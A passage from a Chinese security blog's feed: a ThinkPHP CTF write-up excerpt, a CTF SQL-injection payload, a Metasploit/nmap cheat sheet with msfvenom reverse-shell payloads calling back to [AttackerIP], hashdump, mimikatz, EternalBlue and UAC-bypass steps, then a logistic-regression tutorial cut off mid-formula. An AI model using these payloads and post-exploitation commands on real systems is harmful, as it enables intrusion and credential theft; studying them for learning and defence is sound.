rel="noopener">https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;kun神推荐了一个不错的tp题，正巧最近看了一段时间tp，就去看了下。&lt;/p&gt;
&lt;p&gt;题目地址：&lt;a href=&quot;https://github.com/wonderkun/CTF_web/tree/master/web400-13&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;kun神CTF_WEB-400-13&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;STEP1-任意文件删除&quot;&gt;&lt;a href=&quot;#STEP1-任意文件删除&quot; class=&quot;headerlink&quot; title=&quot;STEP1 任意文件删除&quot;&gt;&lt;/a&gt;STEP1 任意文件删除&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://www.zip&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.zip&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;读了一下，发现逻辑很简单，也没啥可能出漏洞的地方，题目要求是读&lt;code&gt;/etc/flag&lt;/code&gt;，所以大致有以下几种想法：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1. 能否反序列化来任意文件读取或getshell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. mysql的地址是可控的，能否删除lock重装来连接远程数据库任意文件读&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;先来尝试下第一个想法，看看能不能找到TP中的魔术方法中能进行敏感操作的类。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;grep -l &amp;#39;c&amp;#39; $(grep -l &amp;#39;b&amp;#39; $(grep -Rl &amp;#39;a&amp;#39; 2&amp;gt;/dev/null))&lt;/code&gt; 这样能方便的找某个文件中有某几个关键字&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://upload-images.jianshu.io/upload_images/8400344-9b16cbbfc3eb7588.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;找到一个，用他的remove方法&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://love-sg.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>日常学习记录</title>
    <link href="http://love-sg.me/2019/01/22/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://love-sg.me/2019/01/22/日常学习记录/</id>
    <published>2019-01-22T10:50:18.000Z</published>
    <updated>2019-02-24T11:16:03.625Z</updated>
    
    <content type="html"><![CDATA[<p><strong>零散知识点太多了，同一扔这儿</strong></p><h3 id="1-PHP正则"><a href="#1-PHP正则" class="headerlink" title="1. PHP正则"></a>1. PHP正则</h3><p>今天做了一个题，被坑了。。<br>核心代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"content"</span>]))</span><br><span class="line">   &#123;</span><br><span class="line">       $username = $_SESSION[<span class="string">"username"</span>];</span><br><span class="line">       $content = addslashes($_POST[<span class="string">"content"</span>]);</span><br><span class="line"></span><br><span class="line">       $sql = <span class="string">"select username from red where username like '$username#%'"</span>;</span><br><span class="line">       $result = DB::query($sql);</span><br><span class="line">       $old_content = $result[<span class="number">0</span>][<span class="string">"username"</span>];</span><br><span class="line"></span><br><span class="line">       $content = preg_replace(<span class="string">"|#.*|"</span>, <span class="string">"#$content"</span>, $old_content);</span><br><span class="line">      </span><br><span class="line">       $sql = <span class="string">"update red</span></span><br><span class="line"><span class="string">               set username='$content' </span></span><br><span class="line"><span class="string">               where username like '$username#%'"</span>;</span><br><span class="line">       DB::update($sql);</span><br><span class="line">       header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>exp:<code>\&#39;,username=concat(0x7623,version(),user())#</code></p><p>问题出在addslashes后的content上。content传入<code>\&#39;</code>，<code>addslashes</code>+<code>preg_replace</code>后content值为<code>\\&#39;</code>，而不是<code>\&#39;</code>，而如果直接<code>\$content = &quot;\&#39;&quot;</code>，同样操作后的值为<code>\&#39;</code>。如果要通过直接字符串字面量直接匹配，需要<code>\$content = &quot;\\\\\\\&#39;&quot;;</code>这样写。就好像匹配<code>&#39;\&#39;</code>需要<code>&#39;\\\\&#39;</code>一样。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;零散知识点太多了，同一扔这儿&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;1-PHP正则&quot;&gt;&lt;a href=&quot;#1-PHP正则&quot; class=&quot;headerlink&quot; title=&quot;1. PHP正则&quot;&gt;&lt;/a&gt;1. PHP正则&lt;/h3&gt;&lt;p&gt;今天做了一个题，被
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>msf&amp;nmap常用基本操作</title>
    <link href="http://love-sg.me/2018/12/31/msf&amp;nmap%E5%B8%B8%E7%94%A8%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <id>http://love-sg.me/2018/12/31/msf&amp;nmap常用基本操作/</id>
    <published>2018-12-30T16:18:23.000Z</published>
    <updated>2019-03-28T10:06:54.916Z</updated>
    
    <content type="html"><![CDATA[<h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole:"></a>msfconsole:</h3><p><strong>reverese:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">show options </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的</span><br><span class="line">set LPORT [AttackerPort] #默认4444端口 </span><br><span class="line"></span><br><span class="line">运行这两条命令后，4444端口会一直在后台处于侦听状态</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure></p><p><strong>bind:</strong></p><p><code>windows/x64/meterpreter/bind_tcp</code></p><a id="more"></a><p><strong>session</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在Meterpreter Shell中退出session使用 `exit`；</span><br><span class="line"></span><br><span class="line">在模块界面删除session使用 `session -k sessionID`；</span><br><span class="line"></span><br><span class="line">退到后台是 `background`；</span><br></pre></td></tr></table></figure></p><p><strong>scanner</strong></p><p>msf下也包含多种扫描技术,端口扫描很多就不说了。主要说下在meterpreter下通常怎样进行主机发现。</p><p>最常用的应该就是arp扫：<br>Meterpreter(需要先加条路由,下面会说):<code>run post/windows/gather/arp_scanner RHOSTS=192.168.244.0/24</code><br>Nmap:<code>nmap -sn -PR 192.168.3.0/24 以arp的方式扫描</code><br>CMD:<code># start /b arpscan.exe -t 192.168.3.0/24 &gt;&gt; result.txt</code><br>Msfconsole:<code>use auxiliary/scanner/discovery/arp_sweep</code></p><p>域内icmp/tcp/udp啥的也很常用，但底层协议还不是很熟，原因不是很懂。。暂时经验告诉我内网发现经常是arp。。</p><p><strong>autoroute:</strong></p><p>msf的自动添加路由，实在是神器啊!<br>平时配过服务器网的同学对静态路由应该比较熟悉，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s ip/24</span><br></pre></td></tr></table></figure></p><p>background后route print可以看到已经添加的路由</p><p>当然也有autoroute不灵的情况，这时候需要手动指定路由。例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 172.16.63.0 255.255.255.0 sessionid</span><br></pre></td></tr></table></figure></p><p>注意:msf手工设置路由表后，有可能会将添加的路由同步到本机上，造成本机直接可以访问目标机… 这有时候也挺坑的</p><p>加完路由就可以正常内网渗透了。或者用msf加个本地sock4代理,再proxychains配好。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; use auxiliary/server/socks4a </span><br><span class="line"></span><br><span class="line">msf auxiliary(socks4a) &gt; set srvhost 127.0.0.1</span><br><span class="line"></span><br><span class="line">msf auxiliary(socks4a) &gt; set srvport 1080</span><br><span class="line"></span><br><span class="line">msf auxiliary(socks4a) &gt; run</span><br></pre></td></tr></table></figure></p><p><strong>hashdump</strong></p><p>migrate进程后，读下hash</p><p>meterpreter下就记住<code>run post/windows/gather/smart_hashdump</code>以及<code>hashdump</code>就好。<br>至于mimikatz这种神器…就说下几个常用参数</p><p>wdigest 读取内存中存放的账号密码明文信息<br>kerberos 获取kerberos用户信息及密码<br>msv 读的是hash值</p><p><strong>常用模块</strong><br>这里再说一下目前感觉内网比较常用的17010的几种模块。<br>主要参考<a href="https://www.bodkin.ren/index.php/archives/555/" target="_blank" rel="noopener">这位大佬</a>的文章。</p><p>扫描：<code>use auxiliary/scanner/smb/smb_ms17_010</code><br>利用：<br>1.<code>exploit/windows/smb/ms17_010_eternalblue</code><br>2.<code>exploit/windows/smb/ms17_010_psexec</code></p><p>这两种攻击exp有啥区别我也不知道，自己操作的时候就是，一个不行换另一个再试试。。有大佬懂还要麻烦指导一下</p><p>常用总结：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/bad2fc55beff?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</span><br></pre></td></tr></table></figure></p><p><strong>提权</strong></p><p>列出补丁，也可用suggester系列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf &gt; set SESSION 2</span><br><span class="line">msf &gt; exploit</span><br><span class="line"></span><br><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf &gt; set LHOST 192.168.1.107</span><br><span class="line">msf &gt; set SESSION 1</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure></p><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p><strong>-f [指定payload的输出格式]</strong></p><p>按需要的格式进行输出：<br>十六进制hex编码形式 <code>\x0a</code><br>如果用python写exploit，用<code>-f python</code>得到python代码。<br>如果用python写exploit，用<code>-f c</code>得到c代码。<br><code>-f exe\elf</code>就不说了，还有<code>-f psh-reflection</code>生成ps1脚本也挺常用的。</p><p>生成一个exe格式的payload，如：<br><code>msfvenom -p windows/meterpreter/bind_tcp -f exe</code></p><p><strong>-p [指定攻击载荷名称]</strong></p><p>生成payload至少需指定-p 和 -f</p><p>除了自带的那些payload外<br><code>-p -</code>可指定自定义的payload ，用 - 代替管道前的标准输入，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload_file.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw</span><br></pre></td></tr></table></figure><p><strong>-e [指定编码类型]</strong></p><p>也就用过 -e x86/shikata_ga_nai 了</p><p><strong>几个简单reverse payload：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#win x86 </span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f exe -o /tmp/1.exe </span><br><span class="line">x86下 -p后加: windows/../.. 没有这种名字的载荷: windows/x86/../.. </span><br><span class="line"></span><br><span class="line">#linux x86 </span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f elf &gt; 1.elf </span><br><span class="line"></span><br><span class="line">#PHP </span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw &gt; shell.php </span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">#编码</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b &apos;\x00&apos; LHOST=[AttackerIP] LPORT=[AttackerPort] -f exe &gt; 1.exe</span><br></pre></td></tr></table></figure><h3 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter:"></a>meterpreter:</h3><p>sysinfo</p><p>列出受控主机的系统信息</p><hr><p>getuid&amp;getpid</p><p>获得userid和process id</p><hr><p>use priv</p><p>加载特权提升拓展模块，来扩展Meterpreter库</p><hr><p>getsystem</p><p>通过各种攻击向量来提升系统用户权限<br>注意：提权前最好先习惯性的bypassuac<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; exploit</span><br></pre></td></tr></table></figure></p><hr><p>execute -f cmd.exe -i</p><p>执行cmd.exe命令并进行交互</p><hr><p>upload file</p><p>向目标主机上传文件</p><hr><p>download file</p><p>从目标主机上下载文件</p><hr><p>run get_local_subnets </p><p>获取内网网段信息</p><hr><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap:"></a>nmap:</h3><p><strong>批量漏洞扫描：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--script=vulners -sV ip</span><br><span class="line">--script=vulscan -sV ip</span><br></pre></td></tr></table></figure></p><p><strong>nmap常用参数：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-sV:辨识操作系统中运行的服务的类型信息</span><br><span class="line"></span><br><span class="line">-sS:半开扫描，需root</span><br><span class="line"></span><br><span class="line">-sT:三次握手，慢，且目标主机产生大量记录。不需root</span><br><span class="line"></span><br><span class="line">-sn:ping扫描主机， 不进行端口扫描，探测主机存活</span><br><span class="line"></span><br><span class="line">-Pn:no ping，过墙，跳过主机发现。</span><br><span class="line"></span><br><span class="line">--open:只探测状态为open的端口</span><br><span class="line"></span><br><span class="line">-A:aggressive扫描。比较慢</span><br><span class="line"></span><br><span class="line">-O:辨识目标主机的操作系统</span><br><span class="line"></span><br><span class="line">nmap 默认-sP就是ping扫描，如果是在Internet环境中，则应该使用-Pn选项，不要使用ping扫描，因为ICMP数据包通常无法穿透Internet上的网络边界；还可以使用-PU通过对开放的UDP端口进行探测以确定存活的主机。域内icmp还是挺好用的</span><br></pre></td></tr></table></figure><p><strong>常用：</strong><br><code>masscan扫描存活 + nmap -sV -sS -Pn --open</code></p><p><strong>nmap检测服务:</strong></p><p>例 smb:</p><p><code>nmap -v -p139,445 --script=*-vuln-*.nse --script-args=unsafe=1 ip -Pn</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#unsafe=1：高强度扫描，可能造成宕机，可选为0（安全扫描） </span><br><span class="line">#-Pn：有防火墙过滤包，也继续进行扫描</span><br></pre></td></tr></table></figure><p><strong>Nmap扫心脏滴血：</strong><br><code>nmap -sV --script=ssl-heartbleed ip -p 443</code></p><h3 id="MSF-Install"><a href="#MSF-Install" class="headerlink" title="MSF Install"></a>MSF Install</h3><p>记录下安装msf过程，以后新的vps直接无脑复制粘贴就行，postgre密码啥的全都按照下边写的来，这样就不会忘了或乱了。。</p><p>下载安装msf</p><p>打开终端，进入安装目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall</span><br><span class="line">chmod 755 msfinstall</span><br><span class="line">./msfinstall</span><br></pre></td></tr></table></figure><p><strong>安装数据库</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install postgresql</span><br></pre></td></tr></table></figure><p>添加数据库&amp;账户密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su postgres</span><br><span class="line">createuser msf4 -P</span><br></pre></td></tr></table></figure><p>（输入密码&amp;再输入密码 我输入msf）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">createdb --owner=msf4 msf4</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><strong>配置msf数据库</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">db_connect msf4:msf@localhost/msf4</span><br><span class="line">db_status</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇也就就当个备忘录，没有姿势，后边会研究下持久化控制的知识</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;msfconsole&quot;&gt;&lt;a href=&quot;#msfconsole&quot; class=&quot;headerlink&quot; title=&quot;msfconsole:&quot;&gt;&lt;/a&gt;msfconsole:&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;reverese:&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;use exploit/multi/handler &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;show options &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;set payload windows/x64/meterpreter/reverse_tcp &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;set LHOST [AttackerIP] # 如果是公网vps，这里最好写一个内网ip，否则可能会影响后边load。。看issue里写的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;set LPORT [AttackerPort] #默认4444端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;运行这两条命令后，4444端口会一直在后台处于侦听状态&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;set ExitOnSession false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;exploit -j -z&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;bind:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;windows/x64/meterpreter/bind_tcp&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="工具使用" scheme="http://love-sg.me/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Logistic Regression Basic</title>
    <link href="http://love-sg.me/2018/12/29/Logistic-Regression-Basic/"/>
    <id>http://love-sg.me/2018/12/29/Logistic-Regression-Basic/</id>
    <published>2018-12-29T15:34:31.000Z</published>
    <updated>2019-04-25T15:05:13.841Z</updated>
    
    <content type="html"><![CDATA[<p><br>  </p><h2 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h2><h4 id="1-假设函数（Hypothesis-function）"><a href="#1-假设函数（Hypothesis-function）" class="headerlink" title="1.假设函数（Hypothesis function）"></a><strong>1.假设函数（Hypothesis function）</strong></h4><p>首先我们要先介绍一下Sigmoid函数，也称为逻辑函数（Logistic function）：</p><p>$$<br>g(z)= \frac{1}{1+e^{-z}}<br>$$<br>Sigmoid函数曲线如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/8400344-b2ea6e9143565516.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Sigmoid"></p><p>从上图可以看到sigmoid函数是一个s形的曲线，它的取值在[0, 1]之间，在远离0的地方函数的值会很快接近0或者1。它的这个特性对于解决二分类问题十分重要</p><p>接下来将该假设函数与逻辑回归结合：</p><p>$$<br>h_\theta(x) = g(\theta^T x), g(z)= \frac{1}{1+e^{-z}}<br>$$<br>其中 <strong><em>x</em></strong> 是我们的输入，向量 <strong><em>θ</em></strong>  为我们要求取的参数。<br><a id="more"></a><br>接下来的逻辑回归要做的就是：求出一组最好的 <strong><em>θ</em></strong>  ,使得该函数的输出<strong>P</strong>的正确率最满足实际情况。</p><p>$$<br>P(y=1|x;\theta) =g(\theta^Tx)= \frac{1}{1+e^{-\theta^Tx}}<br>$$<br>这个函数的意思就是在给定 <strong><em>x</em></strong>  和 <strong><em>θ</em></strong>  的条件下  <strong><em>y=1</em></strong>   的概率。</p><h4 id="2-决策边界（Decision-Boundary）"><a href="#2-决策边界（Decision-Boundary）" class="headerlink" title="2.决策边界（Decision Boundary）"></a><strong>2.决策边界（Decision Boundary）</strong></h4><p>决策边界，也称为决策面，是用于在N维空间，将不同类别样本分开的平面或曲面。<br><strong>决策边界其实就是一个方程</strong>，在逻辑回归中，决策边界为由 $\theta^Tx=0$ 定义的分界。</p><p>其中，<strong>一次方程</strong>得到的为<strong>线性决策边界</strong>，<strong>高次方程</strong>得到的是<strong>非线性决策边界</strong>。</p><h4 id="3-代价函数（Cost-Function）"><a href="#3-代价函数（Cost-Function）" class="headerlink" title="3.代价函数（Cost Function）"></a><strong>3.代价函数（Cost Function）</strong></h4><p>概况来讲，任何能够衡量模型预测出来的值 <strong><em>h(x)</em></strong> 与真实值 <strong><em>y</em></strong> 之间的差异的函数都可以叫做代价函数 $C(\theta)$。例如，残差平方和就是最小二乘法的cost。<br>如果有多个样本，则可以将所有代价函数的取值求均值，记做 $J(\theta)$。梯度下降的目的也就是求一组 <strong><em>θ</em></strong>  使得 $J(\theta)$最小。</p><hr><h2 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h2><h4 id="Step1-数据"><a href="#Step1-数据" class="headerlink" title="Step1:数据"></a><strong>Step1:数据</strong></h4><p>选定一组数据，其中X1,X2,X3..Xn为自变量，对应输出0或1。即通过一个合理的函数，对一组输入变量有一个合理预判1或0。</p><h4 id="Step2-构造线性函数"><a href="#Step2-构造线性函数" class="headerlink" title="Step2:构造线性函数"></a><strong>Step2:构造线性函数</strong></h4><p>构造函数 <strong><em>h(x)</em></strong> 表示线性预测函数,先初始化线性函数参数 <strong><em>θ</em></strong>  为<strong>1</strong>，即：<strong><em>h(x) = θ1X1+θ2X2+…+θnXn = X1+X2+…+Xn</em></strong></p><h4 id="step3-求cost"><a href="#step3-求cost" class="headerlink" title="step3:求cost"></a><strong>step3:求cost</strong></h4><p>构造一个cost函数，表示预测的输出 <strong><em>h(x)</em></strong> 与训练数据类别 <strong><em>y</em></strong> (y的值为0或1)之间的偏差。</p><p>$$<br>C(\theta)={y log h_\theta(x) + (1-y) \log (1-h_\theta(x)})]<br>$$<br>cost有一个很好的性质：如果 <strong><em>hθ(x) -&gt; 1</em></strong> ，则 <strong><em>cost -&gt; 0</em></strong> ，此时预测的值和真实的值完全相等，代价本该为0；而如果判断 <strong><em>hθ(x) -&gt; 0</em></strong>  ，则 <strong><em>cost -&gt; ∞</em></strong>  ，这很好地惩罚了最后的结果。因此可以此cost合理。</p><p><img src="https://upload-images.jianshu.io/upload_images/8400344-9bec204307d3e5e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p>将cost求和或者求平均，记为 <strong><em>J(θ)</em></strong> 函数，表示所有训练数据预测值与实际类别的偏差。</p><h4 id="step4-梯度下降"><a href="#step4-梯度下降" class="headerlink" title="step4:梯度下降"></a><strong>step4:梯度下降</strong></h4><p>接下来通过梯度下降，调整参数 <strong><em>θ</em></strong>  使得代价函数 <strong><em>J(θ)</em></strong> 取得最小值。<br>$$<br>J(\theta) = -\frac{ 1 }{ m }[\sum_{ i=1 }^{ m } ({y^{(i)} \log h_\theta(x^{(i)}) + (1-y^{(i)}) \log (1-h_\theta(x^{(i)})})]<br>$$<br>梯度下降中的梯度指的是代价函数对各个参数的偏导数，偏导数的方向决定了在学习过程中参数下降的方向，学习率（通常用α表示）决定了每步变化的步长。循环迭代，求导相减即可得到最小的 <strong><em>J(θ)</em></strong><br>此处的m为数据总组数，j为各个$\theta$。在numpy中，通常x为行向量，$\theta$为列向量。最后的$x_j$为列向量。</p><p>$$<br>\theta_j = \theta_j - \alpha (\frac {\partial}{\partial \theta_j})J(\theta)=\theta_j - \alpha (\frac{1}{m})\sum_{i=1}^{m}(h_\theta(x^{(i)})-y^{(i)})x_j^{(i)}<br>$$<br>循环迭代最终输出的是一组使cost最小的 <strong><em>θ</em></strong> 。使 <strong><em>h(x) = 0</em></strong> 得到的决策分界，即为输出0与1的预测分界。</p><p><img src="https://upload-images.jianshu.io/upload_images/8400344-30d385f97b1e0365.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h4 id="step5-带入数据检测得到的h-x"><a href="#step5-带入数据检测得到的h-x" class="headerlink" title="step5:带入数据检测得到的h(x)"></a><strong>step5:带入数据检测得到的h(x)</strong></h4><p>将一组测试向量 <strong><em>x</em></strong> 带入关于线性函数的sigmoid函数，输出的值即为 <strong><em>y=1</em></strong> 的概率。</p><hr><h2 id="一些更有价值的操作："><a href="#一些更有价值的操作：" class="headerlink" title="一些更有价值的操作："></a><strong>一些更有价值的操作：</strong></h2><h4 id="1-正则化"><a href="#1-正则化" class="headerlink" title="1.正则化"></a>1.正则化</h4><p>用于处理一些过拟合情况。<br>过拟合时，如果去掉一些特征，但这些特征包含了一些重要信息不能去掉时，通常考虑加一个正则项。</p><p>$$<br>J(\theta) = -\frac{ 1 }{ m }[\sum_{ i=1 }^{ m } ({y^{(i)} \log h_\theta(x^{(i)}) + (1-y^{(i)}) \log (1-h_\theta(x^{(i)})})]+λ\sum_{ j=1 }^{ m } 